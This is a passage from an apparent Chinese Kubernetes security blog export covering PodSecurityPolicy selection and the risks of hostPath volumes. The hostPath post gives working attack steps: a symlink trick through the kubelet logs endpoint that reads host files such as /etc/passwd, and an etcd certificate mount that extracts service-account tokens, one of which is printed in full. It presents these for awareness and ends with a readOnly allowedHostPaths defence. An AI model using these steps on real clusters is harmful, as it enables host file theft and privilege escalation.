class=\"line\">clusterrole.rbac.authorization.k8s.io/previleged-psp-clusterrole created</span><br><span class=\"line\">clusterrolebinding.rbac.authorization.k8s.io/previleged-psp-binding created</span><br><span class=\"line\">clusterrolebinding.rbac.authorization.k8s.io/restrict-previleged-psp-binding created</span><br></pre></td></tr></table></figure>\n\n<p>接着我们编辑kube-apiserver.yaml来开启psp功能。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ubuntu@server1:/etc/kubernetes/manifests$ sudo vi kube-apiserver.yaml</span><br><span class=\"line\">...</span><br><span class=\"line\">- --enable-admission-plugins=NodeRestriction,PodSecurityPolicy</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"># enable-admission-plugins后面添加PodSecurityPolicy</span><br></pre></td></tr></table></figure>\n\n<p>之后我们来尝试创建pod，然后查看pod被psp应用了没有。</p>\n<p>在<a href=\"https://yizhi.ren/2022/02/06/dangerousprivileges/#create-pod\">create pod</a>中我们创建过这样一个sa：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ alias kl=kubectl</span><br><span class=\"line\"></span><br><span class=\"line\"># user createpod</span><br><span class=\"line\">~$ kl create sa createpod</span><br><span class=\"line\">serviceaccount/createpod created</span><br><span class=\"line\">~$ kl create role createpodrole --verb=list,create --resource=pod</span><br><span class=\"line\">role.rbac.authorization.k8s.io/createpodrole created</span><br><span class=\"line\">~$ kl create rolebinding createpod --serviceaccount=default:createpod --role=createpodrole</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/createpod created</span><br><span class=\"line\">~$ kl get secret | grep createpod</span><br><span class=\"line\">createpod-token-dl28b       kubernetes.io/service-account-token   3      66s</span><br><span class=\"line\">~$ TOKEN=$(kl get secret createpod-token-dl28b -o jsonpath=&#x27;&#123;.data.token&#125;&#x27; | base64 -d)</span><br><span class=\"line\">~$ kl config set-credentials createpod --token=$TOKEN</span><br><span class=\"line\">User &quot;createpod&quot; set.</span><br><span class=\"line\">~$ kl config set-context createpod --cluster kubernetes --user createpod</span><br><span class=\"line\">Context &quot;createpod&quot; created.</span><br></pre></td></tr></table></figure>\n\n<p>我们尝试用这个sa来创建pod，这个sa所在的group为system:serviceaccounts，所以按照预期，这个pod会绑定clusterrole:restrict-previleged-psp-binding, restrict-previleged-psp-binding会绑定psp:restrict-privileged.我们来确认一下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl --context=createpod run ng --image=nginx</span><br><span class=\"line\">pod/ng created</span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl get pod ng -o jsonpath=&#x27;&#123;.metadata.annotations&#125;&#x27;</span><br><span class=\"line\">&#123;&quot;kubernetes.io/psp&quot;:&quot;restrict-privileged&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>与我们预期的一致。</p>\n<p>注意一个特例，在我们初始的集群中，kubectl使用的用户是system:masters组下的，是一个拥有特权的用户，所以对于系统中的所有psp，都是有use权限的，因此system:masters下的用户使用的psp会从系统中全部的psp中选择一个。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl run ng2 --image=nginx</span><br><span class=\"line\">pod/ng2 created</span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl get pod ng2 -o jsonpath=&#x27;&#123;.metadata.annotations&#125;&#x27;</span><br><span class=\"line\">&#123;&quot;kubernetes.io/psp&quot;:&quot;no-privilege&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到psp:no-privilege虽然没有被任何rolebinding和clusterrolebinding所绑定，依然被pod选为使用的psp。</p>\n<h1 id=\"psp优先级选择\"><a href=\"#psp优先级选择\" class=\"headerlink\" title=\"psp优先级选择\"></a>psp优先级选择</h1><p>我们上面提过一嘴，如果一个pod关联了多个psp，那么只能选择一个，选择的过程就相对复杂一些。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create pod-&gt;user/sa-&gt;rolebinding1-&gt;role1-&gt;psp1-&gt;psp rules</span><br><span class=\"line\">                   -&gt;rolebinding2-&gt;role2-&gt;psp2-&gt;psp rules</span><br></pre></td></tr></table></figure>\n\n<p>我们可以通过这些文档了解psp选择的逻辑:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/docs/concepts/policy/pod-security-policy/#policy-order</span><br><span class=\"line\">https://mozillazg.com/2020/05/k8s-kubernetes-use-which-psp-when-there-are-multiple-pod-security-policies.html</span><br><span class=\"line\"></span><br><span class=\"line\">代码：plugin/pkg/admission/security/podsecuritypolicy/admission.go</span><br><span class=\"line\">func (p *Plugin) computeSecurityContext(...)</span><br></pre></td></tr></table></figure>\n\n<p>官方文档这么描述：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.PodSecurityPolicies which allow the pod as-is, without changing defaults or mutating the pod, are preferred. The order of these non-mutating PodSecurityPolicies doesn&#x27;t matter.</span><br><span class=\"line\">2.If the pod must be defaulted or mutated, the first PodSecurityPolicy (ordered by name) to allow the pod is selected.</span><br><span class=\"line\"># 即优先选择不修改pod的psp，其次选择字母序更小的会修改pod的psp。</span><br><span class=\"line\"># 他这里说对于不修改pod的psp，无所谓选择了哪一个。从效果看确实是无所谓的，但是从事实上的选择来说，对于不修改pod的psp，也是按照字母序选择更小的一个psp。</span><br></pre></td></tr></table></figure>\n\n<p>更简单的规则描述是，psp按照两层优先级选择最优的一个。首先不修改pod的优先级&gt;修改pod的优先级，其次字母序更小的优先级&gt;字母序更大的优先级。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://yizhi.ren/2022/01/25/setupk8s/\">树莓派搭建k8s集群</a><br><a href=\"https://kubernetes.io/docs/concepts/security/pod-security-admission/\">Pod Security Admission</a><br><a href=\"https://kubernetes.io/docs/concepts/policy/pod-security-policy/\">Pod Security Policies</a><br><a href=\"https://kubernetes.io/blog/2021/04/06/podsecuritypolicy-deprecation-past-present-and-future/#why-is-podsecuritypolicy-going-away\">Why is PodSecurityPolicy going away</a><br><a href=\"https://github.com/kubernetes/kubernetes/blob/a1513161b3056d4c5ef711ab1c5314e97e90811a/cluster/gce/addons/podsecuritypolicies/node-binding.yaml\">node-binding.yaml</a><br><a href=\"https://yizhi.ren/2022/02/05/dangerousprivileges/#create-pod\">create pod</a><br><a href=\"https://kubernetes.io/docs/concepts/policy/pod-security-policy/#policy-order\">policy-order</a><br><a href=\"https://mozillazg.com/2020/05/k8s-kubernetes-use-which-psp-when-there-are-multiple-pod-security-policies.html\">当有多个可用的 Pod Security Policy 时 k8s 的 PSP 选择策略</a></p>\n","categories":["架构"],"tags":["kubernetes"]},{"title":"k8s中的hostPath的安全隐患","url":"/2022/02/08/hostpath/","content":"<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>挂载一个hostPath的volumes的时候，需要设置挂载方式为read only， 不然存在安全风险。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">volumes:</span><br><span class=\"line\">- name: test-volume</span><br><span class=\"line\">  hostPath:</span><br><span class=\"line\">    path: /data</span><br><span class=\"line\">    type: Directory</span><br><span class=\"line\">这时定义hostpath的volume，定义的时候没有readonly选项。</span><br><span class=\"line\"></span><br><span class=\"line\">volumeMounts:</span><br><span class=\"line\">- name: test-volume</span><br><span class=\"line\">  mountPath: /test-volume</span><br><span class=\"line\">  readOnly: true</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在官方文档中有这么一段话</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/docs/concepts/storage/volumes/#hostpath</span><br><span class=\"line\"></span><br><span class=\"line\">Warning:</span><br><span class=\"line\">HostPath volumes present many security risks, and it is a best practice to avoid the use of HostPaths when possible. When a HostPath volume must be used, it should be scoped to only the required file or directory, and mounted as ReadOnly.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>简单讲就是在强调你在挂载hostpath的volume的时候必须设置readOnly，且必须约束可以挂载的目录。</p>\n<p>设置readOnly是因为，已经证明存在一些方法来绕过约束。比如我配置了hostPath不能访问A目录，但是我可以通过挂载B目录间接访问A目录；或者我配置了hostPath只能访问A目录，但是我可以通过A目录，间接访问到B目录。是不是很神奇。</p>\n<p>下面演示两个例子，来说明不设置readOnly和不约束可挂载目录所带来的隐患。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"主机文件泄露\"><a href=\"#主机文件泄露\" class=\"headerlink\" title=\"主机文件泄露\"></a>主机文件泄露</h2><p>这个例子通过挂载一个特定的可写目录，来实现读取系统任何文件的目的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 首先创建一个pod挂载系统的/var/log目录</span><br><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: Pod</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  creationTimestamp: null</span><br><span class=\"line\">  labels:</span><br><span class=\"line\">    run: busy</span><br><span class=\"line\">  name: busy</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  containers:</span><br><span class=\"line\">  - image: busybox</span><br><span class=\"line\">    name: busy</span><br><span class=\"line\">    resources: &#123;&#125;</span><br><span class=\"line\">    args:</span><br><span class=\"line\">    - sh</span><br><span class=\"line\">    - -c</span><br><span class=\"line\">    - &quot;sleep 1d&quot;</span><br><span class=\"line\">    volumeMounts:</span><br><span class=\"line\">    - name: varlog</span><br><span class=\"line\">      mountPath: /var/log</span><br><span class=\"line\">      # readOnly: true</span><br><span class=\"line\">  dnsPolicy: ClusterFirst</span><br><span class=\"line\">  restartPolicy: Always</span><br><span class=\"line\">  volumes:</span><br><span class=\"line\">  - name: varlog</span><br><span class=\"line\">    hostPath:</span><br><span class=\"line\">      path: /var/log</span><br><span class=\"line\">      type: Directory</span><br><span class=\"line\">status: &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl apply -f busy.yaml --force</span><br><span class=\"line\">pod/busy created</span><br></pre></td></tr></table></figure>\n\n<p>然后我们进到pod中查看该目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl exec busy -it -- sh</span><br><span class=\"line\">/ # cd /var/log</span><br><span class=\"line\">/var/log # ls</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>显然我们是可以看到这个目录下的所有文件的，但是这个时候如果告诉你/var/log目录目前可写，然后希望借助这个目录读取到系统中的任何文件，然后你能想到方案吗，我想不是专业安全人员是不能想到这个方法的。</p>\n<p>这个方法就是通过建立软连接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/var/log # ln -s /etc/passwd passwd.log</span><br><span class=\"line\"></span><br><span class=\"line\">/var/log # cat passwd.log </span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>我们尝试读passwd但是显然读到的是容器内的passwd，我们想要读到的是主机上的passwd。那怎么办呢？</p>\n<p>关键的时候到了，我们先给当前用户配置一个读log的权限：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 给当前sa配置日志相关的权限</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: ClusterRole</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: getlog</span><br><span class=\"line\">rules:</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - &quot;&quot;</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - nodes/log</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - get</span><br><span class=\"line\">---</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: ClusterRoleBinding</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  creationTimestamp: null</span><br><span class=\"line\">  name: getlog</span><br><span class=\"line\">roleRef:</span><br><span class=\"line\">  apiGroup: rbac.authorization.k8s.io</span><br><span class=\"line\">  kind: ClusterRole</span><br><span class=\"line\">  name: getlog</span><br><span class=\"line\">subjects:</span><br><span class=\"line\">- kind: ServiceAccount</span><br><span class=\"line\">  name: default</span><br><span class=\"line\">  namespace: default</span><br><span class=\"line\"># 经过测试用rolebinding不行，得用clusterrolebinding  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">~$ kl apply -f roleset.yaml</span><br><span class=\"line\">clusterrole.rbac.authorization.k8s.io/getlog configured</span><br><span class=\"line\">clusterrolebinding.rbac.authorization.k8s.io/getlog configured</span><br></pre></td></tr></table></figure>\n\n<p>然后通过curl发起连接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 拿到sa的TOKEN</span><br><span class=\"line\">~$ kl get secret</span><br><span class=\"line\">NAME                          TYPE                                  DATA   AGE</span><br><span class=\"line\">...</span><br><span class=\"line\">default-token-5kd6c           kubernetes.io/service-account-token   3      18d</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">~$ TOKEN=$(kl get secret -n default default-token-5kd6c -o jsonpath=&#x27;&#123;.data.token&#125;&#x27; | base64 -d)</span><br><span class=\"line\"></span><br><span class=\"line\"># 拿到pod所在主机ip</span><br><span class=\"line\">~$ HOST=$(kl get pod busy -o jsonpath=&#x27;&#123;.status.hostIP&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 读取日志,指定passwd.log，我们刚才在容器中创建的软连接</span><br><span class=\"line\">~$ curl -k  https://$HOST:10250/logs/passwd.log --header &quot;Authorization: Bearer $TOKEN&quot;</span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>神奇的事情发生了，我们读取到了主机中的文件。原理是当我们通过curl访问kubelet时，kubelet会去读取容器中创建的软连接，并解析到主机上的文件中去，从而导致主机的文件内容泄露。</p>\n<p>我们还可以更进一步，直接在pod内就可以去读主机的文件。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 先进到pod中</span><br><span class=\"line\">~$ kl exec busy -it -- sh</span><br><span class=\"line\">/ # </span><br><span class=\"line\"></span><br><span class=\"line\"># 然后创建脚本</span><br><span class=\"line\">/ # vi readfile.sh </span><br><span class=\"line\">ln -s -f / /var/log/hostroot</span><br><span class=\"line\"></span><br><span class=\"line\">HOST=$(route | grep default | awk -F&#x27; &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class=\"line\">TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)</span><br><span class=\"line\">wget -qO- --header &quot;Authorization: Bearer $TOKEN&quot; https://$HOST:10250/logs/hostroot$1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 然后就可以读文件以及列目录了</span><br><span class=\"line\">/ # sh readfile.sh /etc/passwd</span><br><span class=\"line\">wget: note: TLS certificate validation not implemented</span><br><span class=\"line\">root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/ # sh readfile.sh /tmp/</span><br><span class=\"line\">wget: note: TLS certificate validation not implemented</span><br><span class=\"line\">&lt;pre&gt;</span><br><span class=\"line\">&lt;a href=&quot;.ICE-unix/&quot;&gt;.ICE-unix/&lt;/a&gt;</span><br><span class=\"line\">&lt;a href=&quot;.Test-unix/&quot;&gt;.Test-unix/&lt;/a&gt;</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"集群数据泄露\"><a href=\"#集群数据泄露\" class=\"headerlink\" title=\"集群数据泄露\"></a>集群数据泄露</h2><p>再来看另一种利用方法, 这种方法是用hostPath挂载/etc/kubernetes/pki/etcd，然后连接etcd读取数据。</p>\n<p>etcd中存了集群的所有数据，所以能读到token，从而导致低权限用户权限提升，带来隐患。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 这里需要hostPath和hostNetwork:true和nodeName:server1配合使用</span><br><span class=\"line\">~$ vi etcdctl.yaml </span><br><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: Pod</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  creationTimestamp: null</span><br><span class=\"line\">  labels:</span><br><span class=\"line\">    run: etcdctl</span><br><span class=\"line\">  name: etcdctl</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  containers:</span><br><span class=\"line\">  - image: anonoz/etcdctl-arm64</span><br><span class=\"line\">    name: etcdctl</span><br><span class=\"line\">    command:</span><br><span class=\"line\">    - sleep</span><br><span class=\"line\">    - 1d</span><br><span class=\"line\">    env:</span><br><span class=\"line\">    - name: ETCDCTL_API</span><br><span class=\"line\">      value: &quot;3&quot;</span><br><span class=\"line\">    resources: &#123;&#125;</span><br><span class=\"line\">    volumeMounts:</span><br><span class=\"line\">    - mountPath: /etc/kubernetes/pki/etcd</span><br><span class=\"line\">      name: etcd-certs</span><br><span class=\"line\">  nodeName: server1</span><br><span class=\"line\">  dnsPolicy: ClusterFirst</span><br><span class=\"line\">  restartPolicy: Always</span><br><span class=\"line\">  hostNetwork: true</span><br><span class=\"line\">  volumes:</span><br><span class=\"line\">  - name: etcd-certs</span><br><span class=\"line\">    hostPath:</span><br><span class=\"line\">      path: /etc/kubernetes/pki/etcd</span><br><span class=\"line\">      type: Directory</span><br><span class=\"line\">status: &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl apply -f etcdctl.yaml </span><br></pre></td></tr></table></figure>\n\n<p>随后连到pod中读取secret数据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl exec etcdctl -it -- sh</span><br><span class=\"line\">/ # etcdctl --endpoints 127.0.0.1:2379  --cert=/etc/kubernetes/pki/etcd/server.crt  --key=/etc/kubernetes/pki/etcd/server.key  --cacert=/etc</span><br><span class=\"line\">/kubernetes/pki/etcd/ca.crt get &#x27;&#x27; --from-key --keys-only | grep secret</span><br><span class=\"line\">...</span><br><span class=\"line\">/registry/secrets/kube-system/job-controller-token-klrfg</span><br><span class=\"line\">/registry/secrets/kube-system/kube-proxy-token-md447</span><br><span class=\"line\">/registry/secrets/kube-system/metrics-server-token-vmnrm</span><br><span class=\"line\">/registry/secrets/kube-system/namespace-controller-token-nmvqq</span><br><span class=\"line\">/registry/secrets/kube-system/node-controller-token-6rlxz</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"># 我们随便拿一个secret中的token值来用</span><br><span class=\"line\"># 这个命令会返回一段格式有点乱的内容，但是能清晰的分辨出token的内容。</span><br><span class=\"line\">/ # etcdctl --endpoints 127.0.0.1:2379  --cert=/etc/kubernetes/pki/etcd/server.crt  --key=/etc/kubernetes/pki/etcd/server.key  --cacert=/etc</span><br><span class=\"line\">/kubernetes/pki/etcd/ca.crt get /registry/secrets/kube-system/node-controller-token-6rlxz</span><br><span class=\"line\">...</span><br><span class=\"line\">token?eyJhbGciOiJSUzI1NiIsImtpZCI6InpXaFVvaWdSU19Pbmo5dnUtOGFTWVQ1bjIzYkptWmFpX2Q1VFBuT2EtZTAifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJub2RlLWNvbnRyb2xsZXItdG9rZW4tNnJseHoiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoibm9kZS1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiNDU4MDljM2QtNTNiNS00ZWI5LTk1MTAtNjExOGZmZjY4ZDk0Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOm5vZGUtY29udHJvbGxlciJ9.N8QgQCjv22oE22ct--ib-2A74GaLPkQ6ka1xDysphhljeItSSat1gQRtBawgoF-vuj1a55pdLLPDva9L7sQzG-EaFVUaFBenDeJgOF-vM1LzIqAEmIw4K4IlHKPQNRXi678cJ7mR-R-Iufj9dpOl5zKMS7p_4RydXr8EhfaxgBwqYJkOdQNWIcfPhYM1xiVIplIFKs61Vf0sU1NnSeXJy3WTUqimn_i-d_E5TUMp9_hlIn6iHR4U5UwkGboxFBtfhc0KDn24ShbshpTaM6d6LKJQzrTwTmBwMK2pw0rEfJTKK_Q-3xHlEfF3bj2rcOtrQNylOAVtvggX_elqwXlelQ#kubernetes.io/service-account-token&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 离开pod</span><br><span class=\"line\"># 设置token到kubeconfig中并查看这个token的全部权限</span><br><span class=\"line\">~$ kl config set-credentials tokenfrometcd --token xxx</span><br><span class=\"line\">User &quot;tokenfrometcd&quot; set.</span><br><span class=\"line\">~$ kl config set-context tokenfrometcd --cluster kubernetes --user tokenfrometcd</span><br><span class=\"line\">Context &quot;tokenfrometcd&quot; created.</span><br><span class=\"line\">~$ kl --context=tokenfrometcd auth can-i --list</span><br><span class=\"line\">Resources                                       Non-Resource URLs                     Resource Names          Verbs</span><br><span class=\"line\">events                                          []                                    []                      [create patch update]</span><br><span class=\"line\">events.events.k8s.io                            []                                    []                      [create patch update]</span><br><span class=\"line\">selfsubjectaccessreviews.authorization.k8s.io   []                                    []                      [create]</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"其他方法\"><a href=\"#其他方法\" class=\"headerlink\" title=\"其他方法\"></a>其他方法</h2><p>其他方法还有，这个视频演示了其中的两种：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.youtube.com/watch?v=HmoVSmTIOxM</span><br></pre></td></tr></table></figure>\n\n<p>这个repo列了系统的一些可以利用的敏感数据：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://github.com/BishopFox/badPods/tree/main/manifests/hostpath</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"防御方法\"><a href=\"#防御方法\" class=\"headerlink\" title=\"防御方法\"></a>防御方法</h2><p>防御的方法是在psp中添加约束：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems</span><br><span class=\"line\"></span><br><span class=\"line\">allowedHostPaths:</span><br><span class=\"line\">- pathPrefix: &quot;/foo&quot;</span><br><span class=\"line\">  readOnly: true # only allow read-only mounts</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems\">Volumes and file systems</a><br><a href=\"https://www.youtube.com/watch?v=HmoVSmTIOxM\">The Path Less Traveled: Abusing Kubernetes Defaults</a><br><a href=\"https://kubernetes.io/docs/concepts/storage/volumes/#hostpath\">hostPath</a><br><a href=\"https://github.com/BishopFox/badPods/tree/main/manifests/hostpath\">Bad Pod #4: Unrestricted hostPath</a></p>\n","categories":["架构"],"tags":["kubernetes"]}]